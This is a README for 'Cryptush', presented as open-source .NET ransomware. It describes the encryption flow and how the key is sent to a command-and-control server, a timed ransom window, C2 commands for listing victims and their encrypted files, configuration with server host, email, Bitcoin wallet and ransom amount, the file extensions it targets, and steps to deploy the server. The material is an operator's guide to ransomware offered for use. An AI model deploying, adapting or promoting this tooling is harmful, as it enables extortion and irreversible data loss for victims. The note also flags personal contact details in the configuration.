# Cryptush
An open-source .NET Ransomware

<p align="center">
    <img src="https://i.imgur.com/zuUXyET.png">

</p>

## The Flow

    1- A symmetric AES (256bit) key is generated.

    2- Documents are collected from predefeind directories including its sub-directories.

    3- The key is encrypted with a static public RSA key and sent to the C2 server.

    4- The C2 server returns an GUID for identification and logs the details to CryptushServer.log

    5- The encryption key is then deleted from memory on the victim host and a window is presented including a decryption option and a 24 hours timer.
    

## Notes

* The ransomeware will not run in there's no communication to the C2 server. 
A reconnect attempt will be made every 30 seconds.

## Help

* You can view details about the encrypted victims using the "list" command (hostname, username, launch time, time left for payment, etc.).

* You can view details about the encrypted files on each victim using the "files" command.

### Dependencies

* Client - .NET Framework 4.8
* Server - .NET core 5.0


## Getting Started

* Edit the app.config file inside the Cryptush folder with your details:

    <add key="ServerIP" value="ec2-3-68-73-27.eu-central-1.compute.amazonaws.com" />
    <add key="ServerPort" value="443" />
    <add key="Email" value="yuval555@gmail.com" />
    <add key="BtcWalletAddress" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" />
    <add key="BtcAmount" value="0.035" />
    
* Select the folders to be encrypted in Cryptush.cs, the default is:

```
        public static string[] paths = {
            $"{desktopDir}\\test",
        };
```

* The default extensions are:

```
            var extensions = new List<string> { ".xls", ".doc", ".ppt", ".pdf", ".txt" };

```

You can change them in Cryptush/lib/Collector.cs


## Installing the server on Linux

```
wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update
sudo apt install -y dotnet-runtime-5.0
sudo dotnet CryptushServer.dll --ip=* --port=443
```
